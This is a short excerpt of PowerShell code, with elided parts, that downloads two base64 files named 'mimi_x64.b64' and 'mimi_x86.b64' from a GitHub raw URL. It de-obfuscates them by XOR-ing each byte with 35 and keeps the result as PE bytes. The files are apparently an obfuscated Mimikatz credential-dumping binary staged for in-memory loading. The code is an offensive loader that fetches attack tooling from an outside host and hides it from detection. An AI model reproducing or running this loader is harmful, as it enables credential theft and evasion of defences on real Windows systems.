function decode($da) {
  ...
  $file_b64 =  [Convert]::FromBase64String($da)

  for ($i = 0; $i -lt $file_b64.length; $i++) {
      $file_b64[$i] = $file_b64[$i] -bxor 35
  }

  return [Convert]::ToBase64String($file_b64)
}
...
Function Main
{
    ...
    $pebytes64_b64 = Invoke-WebRequest -Uri https://raw.githubusercontent.com/mrzemienie/tools/master/mimi_x64.b64 -UseBasicParsing
    $pebytes32_b64 = Invoke-WebRequest -Uri https://raw.githubusercontent.com/mrzemienie/tools/master/mimi_x86.b64 -UseBasicParsing

    $PEBytes64 = decode $pebytes64_b64

    $PEBytes32 = decode $pebytes32_b64
